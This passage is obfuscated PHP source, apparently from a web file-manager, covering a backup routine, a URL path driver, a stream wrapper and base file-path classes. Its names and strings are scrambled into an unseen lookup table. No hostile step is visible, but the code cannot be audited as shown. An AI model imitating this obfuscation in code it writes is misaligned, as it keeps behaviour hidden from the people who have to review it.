$ÎÅ‰ƒ“[$_SERVER[§ŒØóıü][369]] : array(); foreach ($³´Ú£ïÆ as $æÔºï½ß) { if (!$this->_fileExist($æÔºï½ß, $¥Šïó¹, $ÜÌûĞ£)) { $äèÚÜı² -= 1; $¢É¼ìä -= (int) $æÔºï½ß[$_SERVER[§ŒØóıü][76]]; write_log("\x66\151\x6c\145\x20\x6e\157\164\x20\x65\x78\x69\163\164\56\146\151\x6c\145\111\x44\72{$æÔºï½ß[$_SERVER[§ŒØóıü][468]]}\x2c\x20\160\x61\x74\150\x3a{$æÔºï½ß[$_SERVER[§ŒØóıü][84]]}", $_SERVER[§ŒØóıü][822]); continue; } $ÁÆÒƒÔ» = $æÔºï½ß[$_SERVER[§ŒØóıü][84]]; $ÓÎş¸õ = "\173\151\x6f\x3a{$í§•õÅİ[$_SERVER[§ŒØóıü][757]]}\x7d" . substr($ÁÆÒƒÔ», strlen("\x7b\151\x6f\x3a{$æÔºï½ß[$_SERVER[§ŒØóıü][823]]}\x7d")); if (IO::exist($ÓÎş¸õ)) { $±Ï å¶Ÿ->updateFileEnd($æÔºï½ß[$_SERVER[§ŒØóıü][32]], $æÔºï½ß[$_SERVER[§ŒØóıü][76]]); } else { $ÓÎş¸õ = get_path_father($ÓÎş¸õ); IO::mkdir($ÓÎş¸õ); if (!IO::copy($ÁÆÒƒÔ», $ÓÎş¸õ, $_SERVER[§ŒØóıü][824])) { write_log($_SERVER[§ŒØóıü][825] . $ÁÆÒƒÔ» . $_SERVER[§ŒØóıü][809] . $ÓÎş¸õ . $_SERVER[§ŒØóıü][164], $_SERVER[§ŒØóıü][786]); $Å¹—€å£ = !1; break; } } $ÓÊ³ö²„ = $æÔºï½ß[$_SERVER[§ŒØóıü][468]]; $Ÿá‚Ù¼ += 1; $–„ìŒÒŸ += $æÔºï½ß[$_SERVER[§ŒØóıü][76]]; $ê—ñ»Ãœ += 1; $ªßˆœ£» += $æÔºï½ß[$_SERVER[§ŒØóıü][76]]; if ($–„ìŒÒŸ >= 1024 * 1024 * 100) { $ƒ³ÍÄùÕ = array($_SERVER[§ŒØóıü][826] => $ÓÊ³ö²„, $_SERVER[§ŒØóıü][827] => $ê—ñ»Ãœ, $_SERVER[§ŒØóıü][828] => $ªßˆœ£»); Backup::set($ƒ³ÍÄùÕ); $–„ìŒÒŸ = $Ÿá‚Ù¼ = 0; } } $—‰ê§§Ú = count($³´Ú£ïÆ); $©âµå‡ú++; } while ($—‰ê§§Ú == $ºÖÒÇ‚); $±Ï å¶Ÿ->end(); $ƒ³ÍÄùÕ = array($_SERVER[§ŒØóıü][829] => 1, $_SERVER[§ŒØóıü][767] => time(), $_SERVER[§ŒØóıü][781] => 1, $_SERVER[§ŒØóıü][826] => $ÓÊ³ö²„, $_SERVER[§ŒØóıü][818] => $¢É¼ìä, $_SERVER[§ŒØóıü][817] => $äèÚÜı², $_SERVER[§ŒØóıü][830] => time()); if ($Ÿá‚Ù¼) { $ƒ³ÍÄùÕ[$_SERVER[§ŒØóıü][827]] = $ê—ñ»Ãœ; $ƒ³ÍÄùÕ[$_SERVER[§ŒØóıü][828]] = $ªßˆœ£»; } Backup::set($ƒ³ÍÄùÕ); $this->_fileFilter($¥Šïó¹); return !0; } private function _fileExist($™ƒÊÑ°¼, &$·Ş‹¿ô, $¨ˆ’ñßĞ) { $êĞªı’™ =& $_SERVER[§ŒØóıü]; $Œ›àœ± = $™ƒÊÑ°¼[$êĞªı’™[84]]; if (in_array($™ƒÊÑ°¼[$êĞªı’™[468]], $·Ş‹¿ô)) { return !1; } if (!in_array($™ƒÊÑ°¼[$êĞªı’™[823]], $¨ˆ’ñßĞ)) { return !1; } if (IO::exist($Œ›àœ±)) { return !0; } $…—¦¾ = get_path_father($Œ›àœ±); if (IO::exist($…—¦¾)) { $·Ş‹¿ô[] = $™ƒÊÑ°¼[$êĞªı’™[468]]; return !1; } $ûÙÁ¡ÜŠ = array($êĞªı’™[823] => $™ƒÊÑ°¼[$êĞªı’™[823]], $êĞªı’™[84] => array($êĞªı’™[383], "{$…—¦¾}\45")); $º§Ã®Ùè = Model($êĞªı’™[795])->where($ûÙÁ¡ÜŠ)->field($êĞªı’™[469])->select(); $·Ş‹¿ô = array_merge($·Ş‹¿ô, array_to_keyvalue($º§Ã®Ùè, $êĞªı’™[12], $êĞªı’™[468])); return !1; } private function _fileFilter($‰“ÑˆĞÚ) { $—ßÈß¹Ä =& $_SERVER[§ŒØóıü]; if (empty($‰“ÑˆĞÚ)) { return; } $şÌÆ§ü™ = array($—ßÈß¹Ä[468] => array($—ßÈß¹Ä[7], array_unique($‰“ÑˆĞÚ))); $Œê‹¥ü„ = Model($—ßÈß¹Ä[831])->where($şÌÆ§ü™)->field($—ßÈß¹Ä[402])->select(); foreach ($Œê‹¥ü„ as $¸»€ú¾Õ) { Model($—ßÈß¹Ä[831])->remove($¸»€ú¾Õ[$—ßÈß¹Ä[402]], !1); } } private function storeIds() { $õê¿Óæ¥ =& $_SERVER[§ŒØóıü]; $Í°ïêÚá = Model($õê¿Óæ¥[773])->listData(); $ë«åê¦ = array(); $ÆùÑÊßá = $GLOBALS[$õê¿Óæ¥[6]][$õê¿Óæ¥[89]][$õê¿Óæ¥[832]]; foreach ($Í°ïêÚá as $³®’Åˆ¿) { $¨€²îË¬ = strtolower($³®’Åˆ¿[$õê¿Óæ¥[95]]); if (!isset($ÆùÑÊßá[$¨€²îË¬])) { continue; } $éÏÍçúÏ = $õê¿Óæ¥[74] . (isset($ÆùÑÊßá[$¨€²îË¬]) ? $ÆùÑÊßá[$¨€²îË¬] : ucfirst($¨€²îË¬)); if (!class_exists($éÏÍçúÏ)) { continue; } $ë«åê¦[] = $³®’Åˆ¿[$õê¿Óæ¥[399]]; } return $ë«åê¦; } } goto FŒÌŸÖ†íá; a½à•Òè‰¡: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($áØÁ¦‘¹ = false) { } public function exist($Äóñ‘¥â) { $õÁ–ööè = $this->info($Äóñ‘¥â); return $õÁ–ööè[$_SERVER[§ŒØóıü][202]]; } public function isFile($Ó¤ÚÀÀ) { $í±¥§ñ = $this->info($Ó¤ÚÀÀ); return $í±¥§ñ[$_SERVER[§ŒØóıü][202]]; } public function isFolder($Œá›˜‹³) { return !1; } public function size($¨ÂÚ ˆ) { $ñ–£İÛ± = $this->info($¨ÂÚ ˆ); return $ñ–£İÛ±[$_SERVER[§ŒØóıü][76]]; } public function info($ıÜ·İ‹µ) { return $this->infoParse($ıÜ·İ‹µ); } public function infoAuth($üĞØÍ¶ù) { return $this->infoParse($üĞØÍ¶ù); } public function infoWithChildren($­¦²ÌĞ) { return $this->infoParse($­¦²ÌĞ); } public function infoFull($Öò¬Ì›¯) { return $this->infoParse($Öò¬Ì›¯); } private function infoParse($À“˜Üê) { $½å©ã‹ =& $_SERVER[§ŒØóıü]; $å–¢ÊªÇ = $this->header($À“˜Üê); if (!$å–¢ÊªÇ || !$å–¢ÊªÇ[$½å©ã‹[755]]) { return !1; } $¾æ–Â£Õ = _get($å–¢ÊªÇ, $½å©ã‹[337], 0); $Äè±õ†¢ = array($½å©ã‹[32] => $å–¢ÊªÇ[$½å©ã‹[32]], $½å©ã‹[84] => $À“˜Üê, $½å©ã‹[33] => $½å©ã‹[200], $½å©ã‹[76] => intval($¾æ–Â£Õ), $½å©ã‹[174] => get_path_ext($å–¢ÊªÇ[$½å©ã‹[32]]), $½å©ã‹[1397] => $¾æ–Â£Õ > 0 && $å–¢ÊªÇ[$½å©ã‹[1519]], $½å©ã‹[1398] => !1); return $Äè±õ†¢; } private function header($„á›áå) { $ç¬˜Âôò =& $_SERVER[§ŒØóıü]; if (isset(self::$_cacheHeader[$„á›áå])) { return self::$_cacheHeader[$„á›áå]; } $ÁŞ™šëá = isset($GLOBALS[$ç¬˜Âôò[1520]]) ? $GLOBALS[$ç¬˜Âôò[1520]] : !1; $GLOBALS[$ç¬˜Âôò[1520]] = !0; self::$_cacheHeader[$„á›áå] = url_header($„á›áå); $GLOBALS[$ç¬˜Âôò[1520]] = $ÁŞ™šëá; return self::$_cacheHeader[$„á›áå]; } public function hashSimple($œ¢ˆ•Ä, $ş±›ğ˜® = false) { $êøÎ…¥ =& $_SERVER[§ŒØóıü]; $ßİ’ÎÚò = $this->info($œ¢ˆ•Ä); if (!$ßİ’ÎÚò || !$ßİ’ÎÚò[$êøÎ…¥[202]]) { return !1; } $®“í÷Ğ = $ßİ’ÎÚò[$êøÎ…¥[76]]; $şÚïğŞ = 200; $¾²„È«Ù = 50; if ($®“í÷Ğ <= $şÚïğŞ * $¾²„È«Ù) { return md5($this->fileSubstr($œ¢ˆ•Ä, 0, $®“í÷Ğ)) . $®“í÷Ğ; } $Ù›üªÃ¿ = intval($®“í÷Ğ / $¾²„È«Ù); $ğŠê±Ëø = $êøÎ…¥[12]; $ñşõ•• = timeFloat(); $òËŞ¢ì = 15; for ($˜´ñÄí¶ = 0; $˜´ñÄí¶ < $¾²„È«Ù; $˜´ñÄí¶++) { if (timeFloat() - $ñşõ•• > $òËŞ¢ì) { return !1; } $…Â×ğìŠ = $this->fileSubstr($œ¢ˆ•Ä, $Ù›üªÃ¿ * $˜´ñÄí¶, $şÚïğŞ); if (!$…Â×ğìŠ) { return !1; } $ğŠê±Ëø .= $…Â×ğìŠ; } $ğŠê±Ëø .= $this->fileSubstr($œ¢ˆ•Ä, $®“í÷Ğ - $şÚïğŞ, $şÚïğŞ); return md5($ğŠê±Ëø) . $®“í÷Ğ; } public function getContent($å‘¤åÄ¿) { return $this->fileSubstr($å‘¤åÄ¿); } public function fileSubstr($Õ„ÔğË¥, $ãËÙ˜ˆ = 0, $”·à´Ÿ¾ = -1) { $”è¼ÀÓ… =& $_SERVER[§ŒØóıü]; $€Ş¥ÓÑ = $this->info($Õ„ÔğË¥); if (!$€Ş¥ÓÑ || !$€Ş¥ÓÑ[$”è¼ÀÓ…[202]] && $€Ş¥ÓÑ[$”è¼ÀÓ…[76]] > 1024 * 1024 * 10) { return !1; } if ($”·à´Ÿ¾ === -1) { $”·à´Ÿ¾ = $€Ş¥ÓÑ[$”è¼ÀÓ…[76]]; } if ($”·à´Ÿ¾ == 0) { return $”è¼ÀÓ…[12]; } $éú¹Äªô = array($”è¼ÀÓ…[1521] . $ãËÙ˜ˆ . $”è¼ÀÓ…[788] . ($ãËÙ˜ˆ + $”·à´Ÿ¾ - 1)); $Ğõ©ü«õ = url_request($Õ„ÔğË¥, $”è¼ÀÓ…[230], !1, $éú¹Äªô, !1, !1, 30); return $Ğõ©ü«õ[$”è¼ÀÓ…[1208]] ? $Ğõ©ü«õ[$”è¼ÀÓ…[1208]] : $”è¼ÀÓ…[12]; } public function download($ËÏ¡«úÕ, $šé¤¯åŸ) { Downloader::start($ËÏ¡«úÕ, $šé¤¯åŸ); return $šé¤¯åŸ; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($¹›¯Íğ¤, $øòÔåÔ = '') { $this->info = $this->info($¹›¯Íğ¤); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[§ŒØóıü][84]]; $this->pathOpen = $¹›¯Íğ¤; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$¹›¯Íğ¤])) { self::$_chunkBuffer[$¹›¯Íğ¤] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($•¤šÅÃÈ) { $ªåô–Ş = $this->fileSubstr($this->pose, $•¤šÅÃÈ); $this->pose += strlen($ªåô–Ş); return $ªåô–Ş; } public function stream_tell() { return $this->pose; } public function stream_seek($à‚ÕØ, $ »É¦Öî) { $ñ®Ÿ®ÜÅ =& $_SERVER[§ŒØóıü]; if ($ »É¦Öî == SEEK_SET) { $this->pose = $à‚ÕØ; } else { if ($ »É¦Öî == SEEK_CUR) { $this->pose += $à‚ÕØ; } else { if ($ »É¦Öî == SEEK_END) { $this->pose = $this->info[$ñ®Ÿ®ÜÅ[76]] + intval($à‚ÕØ); } } } if ($à‚ÕØ < 0) { $this->pose = $this->info[$ñ®Ÿ®ÜÅ[76]] + $à‚ÕØ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[§ŒØóıü][76]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($ÓÖŸıÅÓ, $ìªÄÂİŒ) { $…˜›çŠÁ =& $_SERVER[§ŒØóıü]; $…·øÈ…Ã = $this->info($ÓÖŸıÅÓ); return array($…˜›çŠÁ[1522] => 0, $…˜›çŠÁ[1523] => 0, $…˜›çŠÁ[16] => 32768 + 511, $…˜›çŠÁ[1524] => 0, $…˜›çŠÁ[1525] => 0, $…˜›çŠÁ[1526] => 0, $…˜›çŠÁ[1527] => 0, $…˜›çŠÁ[76] => $…·øÈ…Ã[$…˜›çŠÁ[76]], $…˜›çŠÁ[1528] => $…·øÈ…Ã[$…˜›çŠÁ[1396]], $…˜›çŠÁ[1484] => $…·øÈ…Ã[$…˜›çŠÁ[85]], $…˜›çŠÁ[1483] => $…·øÈ…Ã[$…˜›çŠÁ[201]], $…˜›çŠÁ[1529] => 0, $…˜›çŠÁ[1530] => 0); } static $fileInfo = array(); public function info($²ğå¶çô) { $öÒÓñî = $_SERVER[§ŒØóıü][1531]; if (isset(self::$fileInfo[$²ğå¶çô])) { return self::$fileInfo[$²ğå¶çô]; } if (substr($²ğå¶çô, 0, strlen($öÒÓñî)) != $öÒÓñî) { return !1; } self::$fileInfo[$²ğå¶çô] = IO::info(substr($²ğå¶çô, strlen($öÒÓñî))); return self::$fileInfo[$²ğå¶çô]; } public static function read($ĞÅç¥‹, $‰¨Ú×‹û, $¼öæø¶¥) { if (!isset(self::$_fopenCache[$ĞÅç¥‹])) { $üƒşïô = new StreamWrapperIO(); $üƒşïô->stream_open($ĞÅç¥‹); self::$_fopenCache[$ĞÅç¥‹] = $üƒşïô; } $üƒşïô = self::$_fopenCache[$ĞÅç¥‹]; return $üƒşïô->fileSubstr($‰¨Ú×‹û, $¼öæø¶¥); } public static function _read($“Ú·ù†, $…ü¹‘¿¨, $×‘¿£ûÎ) { $æñ…Ÿ¦ò =& $_SERVER[§ŒØóıü]; $Ş…®’™ = fopen($“Ú·ù†, $æñ…Ÿ¦ò[1400]); if (!$Ş…®’™) { return $æñ…Ÿ¦ò[12]; } $¡í–ëâú = 8192; fseek($Ş…®’™, $…ü¹‘¿¨, SEEK_SET); $ Ö€ëÖ÷ = $æñ…Ÿ¦ò[12]; $ƒúØÆä¹ = 0; while ($ƒúØÆä¹ < $×‘¿£ûÎ) { $ö³æ‹¼® = min($¡í–ëâú, $×‘¿£ûÎ - $ƒúØÆä¹); $ Ö€ëÖ÷ .= fread($Ş…®’™, $ö³æ‹¼®); $ƒúØÆä¹ += $ö³æ‹¼®; } fclose($Ş…®’™); return $ Ö€ëÖ÷; } public function fileSubstr($öù»ÔÖà, $®ÑÖÓÂç) { $†ŠÌ˜ÕØ =& $_SERVER[§ŒØóıü]; $Ù²Û¢Ñå = $this->info[$†ŠÌ˜ÕØ[76]]; $Û Ô¾ë = $öù»ÔÖà; $¡¬—ë­» = $®ÑÖÓÂç; if ($öù»ÔÖà < 0) { $öù»ÔÖà = $Ù²Û¢Ñå + $öù»ÔÖà; } if ($®ÑÖÓÂç === !1) { $®ÑÖÓÂç = $Ù²Û¢Ñå - $öù»ÔÖà; } if ($öù»ÔÖà + $®ÑÖÓÂç > $Ù²Û¢Ñå) { $®ÑÖÓÂç = $Ù²Û¢Ñå - $öù»ÔÖà; } if ($®ÑÖÓÂç <= 0) { return $†ŠÌ˜ÕØ[12]; } if ($öù»ÔÖà < 0 || $öù»ÔÖà >= $Ù²Û¢Ñå || $®ÑÖÓÂç <= 0 || $®ÑÖÓÂç > 1024 * 1024 * 10) { throw new Exception("\151\157\106\151\x6c\x65\x52\145\x61\x64\x20\145\162\162\x6f\x72\41\x20\163\x74\141\x72\x74\x3d{$öù»ÔÖà}\x3b\x6c\x65\156\147\x74\150\x3d{$®ÑÖÓÂç}\73\x20\x73\151\172\145\75{$Ù²Û¢Ñå}\73"); } $¬ÇôĞ = 64 * 1024; $Ãëšˆ’ä =& self::$_chunkBuffer[$this->path]; if (!$Ãëšˆ’ä) { $Ãëšˆ’ä = array(); } $ä‹ÓŞò“ = 0; $ÒşºŞµå = 0; $şä˜Æºæ = $†ŠÌ˜ÕØ[12]; foreach ($Ãëšˆ’ä as $ä‹ÓŞò“ => $şä˜Æºæ) { $ä‹ÓŞò“ = intval($ä‹ÓŞò“); $ÒşºŞµå = $ä‹ÓŞò“ + strlen($şä˜Æºæ); if ($öù»ÔÖà >= $ÒşºŞµå) { continue; } if ($öù»ÔÖà >= $ä‹ÓŞò“ && $öù»ÔÖà + $®ÑÖÓÂç <= $ÒşºŞµå) { return substr($şä˜Æºæ, $öù»ÔÖà - $ä‹ÓŞò“, $®ÑÖÓÂç); } break; } if (count($Ãëšˆ’ä) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($†ŠÌ˜ÕØ[1532], $†ŠÌ˜ÕØ[1533] . count($Ãëšˆ’ä) . "\73\163\164\x61\162\x74\x3d{$öù»ÔÖà}\x2c\154\145\156\x67\164\150\75{$®ÑÖÓÂç}\73\160\x6f\163\x65\72{$ä‹ÓŞò“}\x7e{$ÒşºŞµå}"); throw new Exception($†ŠÌ˜ÕØ[1534]); } $„šãÖÏÃ = intval($öù»ÔÖà / $¬ÇôĞ) * $¬ÇôĞ; $Ù˜»ï™¡ = ceil(($öù»ÔÖà + $®ÑÖÓÂç) / $¬ÇôĞ) * $¬ÇôĞ - $„šãÖÏÃ; $Ë«ÌòöŸ = IO::fileSubstr($this->path, $„šãÖÏÃ, $Ù˜»ï™¡); $Ãëšˆ’ä[$„šãÖÏÃ . $†ŠÌ˜ÕØ[12]] = $Ë«ÌòöŸ; ksort($Ãëšˆ’ä); $ÉÉúƒœ¤ = substr($Ë«ÌòöŸ, $öù»ÔÖà - $„šãÖÏÃ, $®ÑÖÓÂç); return $ÉÉúƒœ¤; } private function log($À«„¬¯”, $‹¢Û²ƒ) { $ó‚›”ƒ¬ =& $_SERVER[§ŒØóıü]; $¢Ã½– ó = timeFloat() - $this->timeStart; write_log(sprintf($ó‚›”ƒ¬[1535], $À«„¬¯”, $this->info[$ó‚›”ƒ¬[32]], $¢Ã½– ó, $‹¢Û²ƒ), $ó‚›”ƒ¬[1188]); } } class Message { function __construct() { } public function send($”Œ”ª”’ = '', $ÍÈÙ†ş­ = array(), $ğØ øí¶ = "\164\145\170\x74") { $‰µÑ€İ =& $_SERVER[§ŒØóıü]; $–ïÕ¾óê = array($‰µÑ€İ[33] => $‰µÑ€İ[1536], $‰µÑ€İ[760] => $”Œ”ª”’); if (in_array($ğØ øí¶, array($‰µÑ€İ[1536], $‰µÑ€İ[1537]))) { $–ïÕ¾óê[$‰µÑ€İ[33]] = $ğØ øí¶; } $ÍÈÙ†ş­ = array($‰µÑ€İ[505] => isset($ÍÈÙ†ş­[$‰µÑ€İ[505]]) ? $ÍÈÙ†ş­[$‰µÑ€İ[505]] : $‰µÑ€İ[12], $‰µÑ€İ[590] => isset($ÍÈÙ†ş­[$‰µÑ€İ[590]]) ? $ÍÈÙ†ş­[$‰µÑ€İ[590]] : $‰µÑ€İ[12]); if (empty($”Œ”ª”’) || empty($ÍÈÙ†ş­[$‰µÑ€İ[505]]) && empty($ÍÈÙ†ş­[$‰µÑ€İ[590]])) { return !1; } $ö¼”ŠÀœ = array($‰µÑ€İ[1477] => $–ïÕ¾óê, $‰µÑ€İ[1538] => $ÍÈÙ†ş­); Hook::trigger($‰µÑ€İ[1539], $ö¼”ŠÀœ); } } goto Aïğ÷‚‹®¥; f³ç‡øğù: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $ø¿›êæª =& $_SERVER[§ŒØóıü]; $this->objectDriver = array($ø¿›êæª[60], $ø¿›êæª[61], $ø¿›êæª[62], $ø¿›êæª[63], $ø¿›êæª[64], $ø¿›êæª[65], $ø¿›êæª[66], $ø¿›êæª[67], $ø¿›êæª[68]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($¸¨°‡Ø) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($¸¨°‡Ø, $_SERVER[§ŒØóıü][8]); } return $¸¨°‡Ø; } public function iconvApp($¿Î—Ëò) { return $¿Î—Ëò; } public function iconvSystem($˜ş§µßš) { return $˜ş§µßš; } public function iconvTo($¡¹Ï„˜ß, $³„—Í, $í¬ğÀ…ş) { $ÏµƒúÎª =& $_SERVER[§ŒØóıü]; if (!$¡¹Ï„˜ß || !function_exists($ÏµƒúÎª[69])) { return $¡¹Ï„˜ß; } static $“‹ÚêÚº = array(); $ü°Äõ£ä = $³„—Í . $ÏµƒúÎª[70] . $í¬ğÀ…ş . $ÏµƒúÎª[71] . $¡¹Ï„˜ß; if (isset($“‹ÚêÚº[$ü°Äõ£ä])) { return $“‹ÚêÚº[$ü°Äõ£ä]; } if (function_exists($ÏµƒúÎª[72])) { $Ú²ÌÂçÇ = @mb_convert_encoding($¡¹Ï„˜ß, $í¬ğÀ…ş, $³„—Í); } else { $Ú²ÌÂçÇ = @iconv($³„—Í, $í¬ğÀ…ş, $¡¹Ï„˜ß); } $Ú²ÌÂçÇ = $Ú²ÌÂçÇ ? $Ú²ÌÂçÇ : $¡¹Ï„˜ß; if (strstr($Ú²ÌÂçÇ, $ÏµƒúÎª[73])) { $Ú²ÌÂçÇ = str_replace($ÏµƒúÎª[73], $ÏµƒúÎª[11], $Ú²ÌÂçÇ); } $“‹ÚêÚº[$³„—Í . $ÏµƒúÎª[70] . $í¬ğÀ…ş . $ÏµƒúÎª[71] . $¡¹Ï„˜ß] = $Ú²ÌÂçÇ; $“‹ÚêÚº[$í¬ğÀ…ş . $ÏµƒúÎª[70] . $³„—Í . $ÏµƒúÎª[71] . $¡¹Ï„˜ß] = $¡¹Ï„˜ß; $“‹ÚêÚº[$í¬ğÀ…ş . $ÏµƒúÎª[70] . $³„—Í . $ÏµƒúÎª[71] . $Ú²ÌÂçÇ] = $¡¹Ï„˜ß; $“‹ÚêÚº[$³„—Í . $ÏµƒúÎª[70] . $í¬ğÀ…ş . $ÏµƒúÎª[71] . $Ú²ÌÂçÇ] = $Ú²ÌÂçÇ; return $Ú²ÌÂçÇ; } public function getPathInner($¤í¸ÔÓÀ) { $°Íà»·… = IO::init($¤í¸ÔÓÀ); return $°Íà»·…->path; } public function getPathOuter($ ¶½­à¼) { $¦ò±åñ© =& $_SERVER[§ŒØóıü]; $ĞÚÄÁß = strlen(trim($this->pathBase, $¦ò±åñ©[8])); $ ¶½­à¼ = substr(trim($ ¶½­à¼, $¦ò±åñ©[8]), $ĞÚÄÁß); return $this->pathDriver . $¦ò±åñ©[8] . ltrim($ ¶½­à¼, $¦ò±åñ©[8]); } public function isParentOf($ğéÂ€òÍ, $ÈŠ’î‘–) { $£•¡û•š =& $_SERVER[§ŒØóıü]; $ğéÂ€òÍ = rtrim(strtolower($ğéÂ€òÍ), $£•¡û•š[8]) . $£•¡û•š[8]; $ÈŠ’î‘– = rtrim(strtolower($ÈŠ’î‘–), $£•¡û•š[8]) . $£•¡û•š[8]; $Ç»½Ù”Œ = strpos($ÈŠ’î‘–, $ğéÂ€òÍ) === 0; return $Ç»½Ù”Œ; } public function getType() { $§ÑŸş‚ê =& $_SERVER[§ŒØóıü]; $§¤èØÚ = str_replace($§ÑŸş‚ê[74], $§ÑŸş‚ê[12], get_class($this)); return strtolower($§¤èØÚ); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($¨ëÛÆ¨¦, $ïÖ”Áìæ) { $œãÕÒ¿ú =& $_SERVER[§ŒØóıü]; $Í×Òó€ä = rtrim($¨ëÛÆ¨¦, $œãÕÒ¿ú[8]) . $œãÕÒ¿ú[8] . $ïÖ”Áìæ; $˜Şíƒæ = $this->exist($Í×Òó€ä); return $˜Şíƒæ ? $Í×Òó€ä : !1; } public function setModifyTime($ùöÄüàÌ, $ü›»™–Ÿ = '') { } public function renameObject($Æñ”îÀ, $˜ğ‡ª¨Æ) { $öŞ¾Š©· = $˜ğ‡ª¨Æ; $Æñ”îÀ = $this->getPathOuter($Æñ”îÀ); $˜ğ‡ª¨Æ = $this->pathFather($Æñ”îÀ) . $˜ğ‡ª¨Æ; $Á’Î‚Ÿ« = IO::copy($Æñ”îÀ, $this->pathFather($Æñ”îÀ), REPEAT_RENAME_FOLDER, $öŞ¾Š©·); if ($Á’Î‚Ÿ«) { IO::remove($Æñ”îÀ); } return $Á’Î‚Ÿ« ? $˜ğ‡ª¨Æ : !1; } public function tempFile($·œø«Ã = '', $‰’¢€–‹ = '') { if (!$·œø«Ã) { $·œø«Ã = rand_string(15); } $ôúºŠ¹ê = TEMP_FILES . rand_string(15) . $_SERVER[§ŒØóıü][8]; @mkdir($ôúºŠ¹ê, DEFAULT_PERRMISSIONS, !0); $¾çİ€”­ = $ôúºŠ¹ê . $·œø«Ã; @touch($¾çİ€”­); if ($‰’¢€–‹) { file_put_contents($¾çİ€”­, $‰’¢€–‹); } return $¾çİ€”­; } public function tempFileRemve($çÖ‰ãš) { @unlink($çÖ‰ãš); @rmdir($this->pathFather($çÖ‰ãš)); } public function mkfile($â¿üø¦®, $ŸÄ€À = '', $¬Õ€×‹¸ = REPEAT_RENAME) { } public function mkdir($®Ğ§ûà, $Ã¶»·ÍÊ = REPEAT_SKIP) { } public function delFile($ãÆµêÓû) { } public function delFolder($ª É‡çù) { } public function copyFile($úØÚùë…, $ıìı‚…ò) { } public function moveFile($·Ü¬Ç , $ª¶İëÑŒ) { } public function remove($¦Â– ¡¹) { if ($this->isFile($¦Â– ¡¹)) { return $this->delFile($¦Â– ¡¹); } return $this->delFolder($¦Â– ¡¹); } public function rename($Èó²Åò, $Òµ ½çÑ) { } public function exist($óªÌÛƒ®) { } public function findByHash($í©ù²äÈ = '', $‡‚®ş×ı = '') { return !1; } public function isFile($À›£Ç¢¼) { } public function isFolder($ûì“ç˜á) { } public function size($óåÌ¢®) { } public function info($Ñ²ñîèé) { } public function infoSimple($»Î„) { return $this->info($»Î„); } public function infoAuth($òÙÖ„¾ş) { return $this->info($òÙÖ„¾ş); } public function infoFull($…êÊœãä) { return $this->info($…êÊœãä); } public function infoWithChildren($¦ÂÁƒÀ) { $ØŸñª³· =& $_SERVER[§ŒØóıü]; static $œ­ÁÔ = array(); if (isset($œ­ÁÔ[$¦ÂÁƒÀ])) { return $œ­ÁÔ[$¦ÂÁƒÀ]; } $³ªÌÎ† = $this->info($¦ÂÁƒÀ); if ($³ªÌÎ† && $³ªÌÎ†[$ØŸñª³·[33]] == $ØŸñª³·[75]) { $Á¨É›˜ = array($ØŸñª³·[76] => 0, $ØŸñª³·[77] => 0, $ØŸñª³·[78] => 0); $this->infoChildren($¦ÂÁƒÀ, $Á¨É›˜); $³ªÌÎ†[$ØŸñª³·[76]] = $Á¨É›˜[$ØŸñª³·[76]]; $³ªÌÎ†[$ØŸñª³·[79]] = array($ØŸñª³·[80] => $Á¨É›˜[$ØŸñª³·[77]], $ØŸñª³·[81] => $Á¨É›˜[$ØŸñª³·[78]]); $œ­ÁÔ[$¦ÂÁƒÀ] = $³ªÌÎ†; } return $³ªÌÎ†; } public function listPath($÷¹¸Ù×€, $Å°¹¯ûß = false) { } public function has($ùóÑİñ¯, $çÜóÁ¥ì = false, $µÚ‘äá• = false) { } public function canRead($ä©³À£ì) { } public function canWrite($©Ó±ï÷Ì) { } public function getContent($šÙ’”Şƒ) { } public function setContent($Øø½Üİ, $æ¸ÕŒĞ = '') { } protected function infoChildren($´òËâ½á, &$Š½‘É“) { $¹‘°àË› =& $_SERVER[§ŒØóıü]; check_abort_echo(); $Ü¼‚ŞÓÁ = $this->listPath($´òËâ½á, !0); $Ü¼‚ŞÓÁ = array_merge($Ü¼‚ŞÓÁ[$¹‘°àË›[82]], $Ü¼‚ŞÓÁ[$¹‘°àË›[83]]); foreach ($Ü¼‚ŞÓÁ as $ÄŒâ‰¬É) { if ($ÄŒâ‰¬É[$¹‘°àË›[33]] == $¹‘°àË›[75]) { $Š½‘É“[$¹‘°àË›[78]]++; $Ò«¿æ©´ = $this->getPathInner($ÄŒâ‰¬É[$¹‘°àË›[84]]); $this->infoChildren($Ò«¿æ©´, $Š½‘É“); } else { $Š½‘É“[$¹‘°àË›[77]]++; $Š½‘É“[$¹‘°àË›[76]] += $ÄŒâ‰¬É[$¹‘°àË›[76]]; } } } public function fileSubstr($ŒÍïĞâ, $æø¿Œîª, $Ü©û¥Œø) { } public function listAll($©¼±Ğ¬Í) { } public function listAllMake($§ÂØ’Ã‘, &$³™«­Ë„) { $ƒ”ôƒ¤ =& $_SERVER[§ŒØóıü]; check_abort_echo(); $§ûã®İ = $this->listPath($§ÂØ’Ã‘, !0); if (!$§ûã®İ) { return; } $ê‰‡Õçñ = array_merge($§ûã®İ[$ƒ”ôƒ¤[82]], $§ûã®İ[$ƒ”ôƒ¤[83]]); foreach ($ê‰‡Õçñ as $î„‡’¶é) { $ƒÎº½ñî = $î„‡’¶é[$ƒ”ôƒ¤[33]] == $ƒ”ôƒ¤[75]; $Á Öè¦Œ = array($ƒ”ôƒ¤[84] => $î„‡’¶é[$ƒ”ôƒ¤[84]], $ƒ”ôƒ¤[75] => $ƒÎº½ñî); if 